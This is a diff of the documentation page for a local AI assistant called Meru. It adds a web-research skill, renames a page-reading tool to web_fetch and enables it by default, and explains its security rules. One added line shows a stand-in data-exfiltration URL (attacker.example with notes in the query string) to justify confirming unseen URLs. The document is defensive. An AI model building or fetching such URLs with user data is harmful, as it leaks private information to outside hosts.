@@ -782,13 +782,14 @@ Prefers short replies, with the answer in the first sentence.</code></pre>
 
 <p>A skill is a Markdown file of instructions at <code>~/.meru/skills/&lt;name&gt;/SKILL.md</code>, with a name and a short description of when to use it. The prompt carries only names and descriptions. <code>merud</code> loads a skill's full text when a short model call picks it, so adding skills barely grows the prompt.</p>
 
-<p>Two skills ship inside the program:</p>
+<p>Three skills ship inside the program:</p>
 
 <div class="tbl"><table>
   <thead><tr><th>Skill</th><th>What it does</th></tr></thead>
   <tbody>
     <tr><td><code>writing</code></td><td>plain-English rules for any prose Meru writes: emails, summaries, reports</td></tr>
     <tr><td><code>explainer</code></td><td>builds a self-contained web page that teaches a topic, with diagrams</td></tr>
+    <tr><td><code>web-research</code></td><td>for questions about current facts: search, read the best one or two pages, prefer the project's own site, check dates, cite each URL</td></tr>
   </tbody>
 </table></div>
 
@@ -805,7 +806,7 @@ Prefers short replies, with the answer in the first sentence.</code></pre>
   <li><b>Deny by default.</b> A server that offers 40 tools gives the model none until you name specific ones in its <code>allow</code> list. Wildcards aren't allowed: a <code>*</code> would let in tools a server adds in a later release, which nobody has read.</li>
   <li><b>Confirm.</b> Tools on the <code>confirm</code> list ask you on every call.</li>
   <li><b>Loopback unless you say otherwise.</b> <code>merud</code> refuses a server or agent URL off this machine unless its entry says <code>remote = true</code>. An agent elsewhere may pass your message to a cloud model, so that setting means consent for your data to leave. <code>remote</code> covers only where <code>merud</code> may connect. The <code>google</code> server sits on loopback with <code>remote = false</code> and still talks to Google. Before a rename it was <code>network</code>, and <code>merud</code> refuses to load a config that still says <code>network</code>. The A2A client checks each address again as it connects, and follows no redirects, so an agent's card can't point the calls somewhere else.</li>
-  <li><b>One door.</b> MCP tools, A2A agents, local commands and the built-in tools all go through <code>dispatch</code>. No other code reaches them. The built-in tools are <code>configure</code>, <code>remember</code>, <code>write_file</code>, the web tools <code>web_search</code> and <code>web_url_read</code>, and three that only read your files: <code>read_file</code> returns a whole file, 12,000 characters at a time; <code>list_folder</code> shows what a folder holds; <code>grep</code> finds every line that matches. The built-in tools need no allow entry: the model always sees them. The three file tools reach only your <code>[index] folders</code> and skip what the indexer skips, so they read nothing search couldn't.</li>
+  <li><b>One door.</b> MCP tools, A2A agents, local commands and the built-in tools all go through <code>dispatch</code>. No other code reaches them. The built-in tools are <code>configure</code>, <code>remember</code>, <code>write_file</code>, the web tools <code>web_search</code> and <code>web_fetch</code>, and three that only read your files: <code>read_file</code> returns a whole file, 12,000 characters at a time; <code>list_folder</code> shows what a folder holds; <code>grep</code> finds every line that matches. The built-in tools need no allow entry: the model always sees them. The three file tools reach only your <code>[index] folders</code> and the folder <code>web_fetch</code> downloads into, and skip what the indexer skips.</li>
 </ul>
 
 <figure id="fig-dispatch">
@@ -890,7 +891,11 @@ Prefers short replies, with the answer in the first sentence.</code></pre>
 
 <p>Meru searches the web through <b>SearXNG</b>, a search engine you run on your own machine in Docker. SearXNG keeps no index: it passes the search words to engines such as Google, Bing and DuckDuckGo, drops the cookies that identify you, and merges the results. It needs no account and no API key. <code>merud</code> reaches it on loopback at <code>[web] searxng_url</code>, <code>http://127.0.0.1:8888</code> by default, and refuses a URL off this machine.</p>
 
-<p>The built-in <code>web_search</code> tool sends one search and gives the model numbered results: title, URL, a short snippet and the date when known. The model cites the URLs it uses. A second tool, <code>web_url_read</code>, fetches one public page (HTML, PDF or plain text) and returns its text in 12,000-character pages. It is off until you set <code>[web] read_pages = true</code>, because it makes <code>merud</code> itself connect to sites off this machine, and those sites see your IP address. It refuses any address on this machine or your local network, checked as it connects, so neither a page nor a redirect can point it at your router or another local service.</p>
+<p>The built-in <code>web_search</code> tool sends one search and gives the model numbered results: title, URL, a short snippet and the date when known. The model cites the URLs it uses. A second tool, <code>web_fetch</code>, fetches one public page (HTML, PDF or plain text). Without a prompt it returns the page's text in 12,000-character pages. With a prompt, such as "what is the latest release?", the fast model reads up to 48,000 characters of the page and answers from the page alone, quoting its versions and dates. With <code>save</code>, it downloads the file to <code>~/meru-output/downloads/</code> instead.</p>
+
+<p><code>web_fetch</code> is on by default, because a small model that trusts old snippets gets "what's the latest release?" wrong. <code>[web] fetch = false</code> turns it off. It makes <code>merud</code> itself connect to sites off this machine, and those sites see your IP address. It refuses any address on this machine or your local network, checked as it connects, so neither a page nor a redirect can point it at your router or another local service.</p>
+
+<p>A URL can also carry data out: <code>https://attacker.example/?notes=...</code>. So <code>web_fetch</code> runs without asking only for a URL that a search result or your own question showed earlier in the same session. Any other URL asks you first, and so does every download. A scheduled job has nobody to ask, so it skips them.</p>
 
 <p>Your search words leave the machine, through SearXNG to the engines it asks. Your question, your files and the answer don't. When SearXNG isn't running, <code>merud</code> still starts, and a search fails with a message that points at the setup steps in <code>docs/running.md</code>.</p>
 
@@ -962,7 +967,7 @@ argv        = ["git", "-C", "{repo}", "log", "--since=1.week", "--oneline"]
 <ul>
   <li>The code has no path to a cloud model. The engine talks only to Ollama on loopback.</li>
   <li>You allow MCP tools and A2A agent skills one by one. An agent or Streamable HTTP server off this machine needs <code>remote = true</code> in its config entry. That setting covers where <code>merud</code> connects; a loopback server such as <code>google</code> still talks to Google.</li>
-  <li>Web search sends your search words through SearXNG to the engines it asks. <code>[web] read_pages</code> is the one setting that lets <code>merud</code> fetch pages off this machine, and it never fetches one on your machine or local network.</li>
+  <li>Web search sends your search words through SearXNG to the engines it asks. <code>web_fetch</code> lets <code>merud</code> fetch public pages off this machine when the model asks, never one on your machine or local network. It asks you first for a URL no search or question of yours gave, and before any download. <code>[web] fetch = false</code> turns it off.</li>
   <li>Meru doesn't sandbox MCP servers, so choose them as you would any program.</li>
   <li>A local command runs as you, and reaches the network if you declare one that does, such as <code>curl</code>. You chose it, and <code>meru log</code> shows every run.</li>
   <li>API keys sit in one file only you can read, never in config, and never pass through the model.</li>
